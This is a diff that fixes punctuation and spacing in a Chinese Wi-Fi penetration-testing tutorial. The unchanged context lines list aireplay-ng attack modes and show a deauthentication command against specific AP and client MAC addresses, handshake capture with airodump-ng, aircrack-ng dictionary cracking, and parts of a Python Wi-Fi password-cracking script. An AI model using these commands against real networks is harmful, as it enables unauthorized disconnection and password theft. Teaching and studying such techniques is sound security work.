@@ -47,13 +47,13 @@ Beacons: AP 发送的公告报文数量。每个接入点以最低速率每秒�
 #Data: 捕获的数据包数量（如果是 WEP，则为唯一 IV 计数），包括数据广播包  
 #/s: 过去 10 秒内每秒检测量的数据包  
 CH: 通道号（取自信标数据包）。即使未跳频，有时也会捕获来自其他通道的数据包，因为无线电干扰或通道重叠。  
-MB: AP 支持的最大速度。如果网络启用了 QoS，则在 MB 速度值后面显示 “e” 。  
-ENC: 使用的加密算法。 OPN 表示不加密。  
-CIPHER: 检测到密码。 CCMP、WRAP、TKIP、WEP、WEP40 或 WEP104 之一。  
-AUTH: 使用的身份验证协议。MGT（使用单独身份验证服务器的 WPA/WPA2）、SKA（WEP 共享密钥）、PSK （WPA/WPA2 预共享密钥）或 OPN（对 WEP 开放）之一。  
+MB: AP 支持的最大速度。如果网络启用了 QoS，则在 MB 速度值后面显示“e” 。  
+ENC: 使用的加密算法。OPN 表示不加密。  
+CIPHER: 检测到密码。CCMP、WRAP、TKIP、WEP、WEP40 或 WEP104 之一。  
+AUTH: 使用的身份验证协议。MGT（使用单独身份验证服务器的 WPA/WPA2）、SKA（WEP 共享密钥）、PSK（WPA/WPA2 预共享密钥）或 OPN（对 WEP 开放）之一。  
 ESSID: 无线网络名称，如果启用了 SSID 隐藏，则可以为空。  
 STATION: 每个关联站或搜索要连接的 AP 的站的 MAC 地址。  
-Reate: 站的接收速率，其次是发送速率。如果网络启用了 QoS，则在每个速率后显示 “e”。  
+Reate: 站的接收速率，其次是发送速率。如果网络启用了 QoS，则在每个速率后显示“e”。  
 Lost: 根据序列号计算过去 10 秒内丢失的数据包数量。请参阅下面的注释以获取更详细的说明。  
 Frames: 数据帧  
 Notes: 有关客户端的其他信息，例如捕获的 EAPOL 或 PMKID。  
@@ -69,19 +69,19 @@ airodump-ng -d 68:77:24:65:EE:CF -c 11 wlan0
 
 **Aireplay-ng**  
 Aireplay-ng 提供了多种攻击选项  
-\[0\] Deauthentication Attack（断开认证攻击）： 向目标设备发送伪造的 Deauthentication 帧，迫使目标设备与 Wi-Fi 网络断开连接。  
-\[1\] Fake Authentication（伪造认证攻击）： 伪造认证请求，试图与接入点建立虚假的认证会话。  
-\[2\] Interactive Packet Replay（交互式数据包重放攻击）： 攻击者可以选择性地重放已捕获的数据包，以模拟某些网络活动。  
-\[3\] ARP Request Replay Attack（ARP 请求重放攻击）： 重播捕获的 ARP 请求，以生成新的数据流量，可能导致捕获握手信息。  
-\[4\] KoreK Chopchop Attack（KoreK Chopchop 攻击）： 这是一种针对 WEP 加密的攻击，尝试解密加密的数据包。  
-\[5\] Fragmentation Attack（分段攻击）： 通过分段 Wi-Fi 数据包来尝试破解 WEP 加密。  
-\[6\] Cafe-latte Attack（Cafe-latte 攻击）： 一种针对 WEP 加密的攻击，利用多个不同加密密钥的数据包。  
-\[7\] Client-oriented Fragmentation Attack（客户端导向的分段攻击）： 类似于分段攻击，但更专注于向特定的客户端发送分段数据包。  
-\[8\] WPA Migration Mode（WPA 迁移模式攻击）： 尝试从 WPA 模式切换到 WEP 模式。  
-\[9\] Injection Test（注入测试）： 向 Wi-Fi 网络注入数据包，测试网络的安全性和稳定性。
+\[0\] Deauthentication Attack（断开认证攻击）：向目标设备发送伪造的 Deauthentication 帧，迫使目标设备与 Wi-Fi 网络断开连接。  
+\[1\] Fake Authentication（伪造认证攻击）：伪造认证请求，试图与接入点建立虚假的认证会话。  
+\[2\] Interactive Packet Replay（交互式数据包重放攻击）：攻击者可以选择性地重放已捕获的数据包，以模拟某些网络活动。  
+\[3\] ARP Request Replay Attack（ARP 请求重放攻击）：重播捕获的 ARP 请求，以生成新的数据流量，可能导致捕获握手信息。  
+\[4\] KoreK Chopchop Attack（KoreK Chopchop 攻击）：这是一种针对 WEP 加密的攻击，尝试解密加密的数据包。  
+\[5\] Fragmentation Attack（分段攻击）：通过分段 Wi-Fi 数据包来尝试破解 WEP 加密。  
+\[6\] Cafe-latte Attack（Cafe-latte 攻击）：一种针对 WEP 加密的攻击，利用多个不同加密密钥的数据包。  
+\[7\] Client-oriented Fragmentation Attack（客户端导向的分段攻击）：类似于分段攻击，但更专注于向特定的客户端发送分段数据包。  
+\[8\] WPA Migration Mode（WPA 迁移模式攻击）：尝试从 WPA 模式切换到 WEP 模式。  
+\[9\] Injection Test（注入测试）：向 Wi-Fi 网络注入数据包，测试网络的安全性和稳定性。
 
 **Deauthentication Attack**  
-例如:
+例如：
 
 ```plain
 aireplay-ng -0 10 -a DC:33:3D:76:55:10 -c 28:6B:35:26:D8:BF wlan0
@@ -90,7 +90,7 @@ aireplay-ng -0 10 -a DC:33:3D:76:55:10 -c 28:6B:35:26:D8:BF wlan0
 [![](assets/1710899986-df9502c1b7d6d42c25fa489542ac2e91.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240303111703-81d10ca2-d90c-1.png)
 
 ● -0 表示取消认证  
-● 1 是要发送的解除验证数量（如果您愿意，可以发送多个）； 0 表示连续发送  
+● 1 是要发送的解除验证数量（如果您愿意，可以发送多个）；0 表示连续发送  
 ● -a DC:33:3D:76:55:10 是接入点的 MAC 地址  
 ● -c 28:6B:35:26:D8:BF 是要取消验证的客户端的 MAC 地址；如果省略，则所有客户端都将被取消身份验证  
 ● wla0 是接口名称  
@@ -126,7 +126,7 @@ Deauth 攻击除了断网攻击外，还可以有其他利用方式
 airodump-ng -d DC:33:3D:76:55:10 -c 1 wlan0 -w test
 ```
 
-\-w test： 将监听到的数据包写入到当前文件夹，文件名称以 test 开头  
+\-w test：将监听到的数据包写入到当前文件夹，文件名称以 test 开头  
 然后执行 Deauth 攻击
 
 ```plain
@@ -179,7 +179,7 @@ aircrack-ng -a2 -b DC:33:3D:76:55:10  -w  passwd_dic.txt test-01.cap
 ```
 
 ```plain
-aircrack-ng -a2  -e TP-LINK二楼 -w  passwd_dic.txt test-02.cap
+aircrack-ng -a2  -e TP-LINK 二楼 -w  passwd_dic.txt test-02.cap
 ```
 
 ### 万能钥匙
@@ -263,17 +263,17 @@ def main():
     target_num = -1
     while not exit_flag:
         try:
-            print('WiFi破解工具'.center(35, '-'))
+            print('WiFi 破解工具'.center(35, '-'))
             wifi_list = wifi_scan()
             choose_exit_flag = 0
             while not choose_exit_flag:
                 try:
-                    target_num = int(input('请选择你要尝试破解的wifi：'))
+                    target_num = int(input('请选择你要尝试破解的 wifi：'))
                     if target_num in range(len(wifi_list)):
                         # 二次确认
                         while not choose_exit_flag:
                             try:
-                                choose = str(input(f'你选择要破解的WiFi名称是：{wifi_list[target_num][1]}，确定吗？（Y/N）'))
+                                choose = str(input(f'你选择要破解的 WiFi 名称是：{wifi_list[target_num][1]}，确定吗？（Y/N）'))
                                 # 对用户输入进行小写处理，并判断
                                 if choose.lower() == 'y':
                                     choose_exit_flag = 1
@@ -314,6 +314,6 @@ if __name__ == '__main__':
 [https://www.sohu.com/a/661410953\_100113888](https://www.sohu.com/a/661410953_100113888)  
 [https://cn-sec.com/archives/486272.html](https://cn-sec.com/archives/486272.html)
 
-参考:  
+参考： 
 [https://www.51cto.com/article/708053.html](https://www.51cto.com/article/708053.html)  
 [https://www.cnblogs.com/hahaa/p/15393324.html](https://www.cnblogs.com/hahaa/p/15393324.html)
